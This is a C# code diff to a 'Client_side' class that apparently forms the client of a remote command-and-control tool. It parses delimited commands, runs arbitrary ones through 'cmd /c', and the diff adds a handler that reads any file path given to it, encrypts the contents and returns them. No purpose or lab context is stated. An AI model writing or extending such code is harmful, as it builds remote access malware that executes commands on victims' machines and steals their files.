@@ -12,15 +12,15 @@ namespace Client_side
         {
             string delimiter = "|;|";
             string[] commandParts = command.Split(delimiter);
-            string type = commandParts[0];
-            string result = string.Empty;
-            switch (type)
+            string id = commandParts[0];
+            string result;
+            switch (id)
             {
                 case "1":
                     result = ExecuteCommand(commandParts[1]);
                     break;
                 case "2":
-                    result = "Command type not supported";
+                    result = GetFile(commandParts[2]);
                     break;
                 default:
                     result = "Invalid command type";
@@ -31,7 +31,7 @@ namespace Client_side
         }
         public static string ExecuteCommand(string command)
         {
-            string result = string.Empty;
+            string result;
             try
             {
                 System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
@@ -50,9 +50,20 @@ namespace Client_side
             return result;
         }
 
-        public static byte[] GetFile(string command)
+        public static string GetFile(string path)
         {
-            return System.IO.File.ReadAllBytes(command);
+            string fileContent;
+            try
+            {
+                fileContent = System.IO.File.ReadAllText(path);
+                fileContent = Encryptor.ConvertStr(fileContent);
+            }
+            catch (Exception e)
+            {
+                fileContent = e.Message;
+            }
+
+            return fileContent;
         }
     }
 }
